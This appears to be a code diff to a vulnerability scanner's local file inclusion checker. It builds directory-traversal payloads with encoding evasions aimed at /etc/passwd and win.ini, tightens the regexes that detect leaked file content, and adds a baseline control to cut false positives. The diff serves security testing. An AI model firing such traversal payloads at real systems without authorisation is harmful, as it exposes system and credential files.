@@ -6,8 +6,11 @@
 
 /** Standard traversal payloads for a known file, in the usual evasions. */
 export function traversalPayloads(): { payload: string; marker: RegExp; what: string }[] {
-  const unix = /root:.?:0:0:/; // /etc/passwd first line
-  const win = /\[(?:fonts|extensions|mci extensions)\]/i; // win.ini
+  // A COMPLETE /etc/passwd root entry (7 colon fields ending in a shell path),
+  // not just the "root:...:0:0:" fragment which can appear in unrelated text.
+  const unix = /(^|\n)root:[^:\n]*:0:0:[^:\n]*:[^:\n]*:\/[^\n]*/;
+  // win.ini: the 16-bit comment, or two distinct sections together (one marker alone is too generic).
+  const win = /(; for 16-bit app support|\[fonts\][\s\S]{0,600}\[extensions\]|\[extensions\][\s\S]{0,600}\[fonts\])/i;
   const depths = ["../".repeat(8), "..%2f".repeat(8), "....//".repeat(8), "..%252f".repeat(8)];
   const out: { payload: string; marker: RegExp; what: string }[] = [];
   for (const d of depths) {
@@ -20,7 +23,9 @@ export function traversalPayloads(): { payload: string; marker: RegExp; what: st
 }
 
 /** Proven iff the response carries the target file's own content. Pure, testable. */
-export function lfiOracle(input: { body: string; marker: RegExp }): { verdict: "proven" | "lead"; reason: string } {
-  if (input.marker.test(input.body)) return { verdict: "proven", reason: "the response returned the contents of a system file" };
-  return { verdict: "lead", reason: "no system-file content in the response" };
+export function lfiOracle(input: { body: string; marker: RegExp; baseline?: string }): { verdict: "proven" | "lead"; reason: string } {
+  if (!input.marker.test(input.body)) return { verdict: "lead", reason: "no system-file content in the response" };
+  // Negative control: the file content must be NEW, not already in the baseline page.
+  if (input.baseline && input.marker.test(input.baseline)) return { verdict: "lead", reason: "the marker is already in the baseline response: not caused by the traversal" };
+  return { verdict: "proven", reason: "the response returned a system file's own content (absent from the baseline)" };
 }
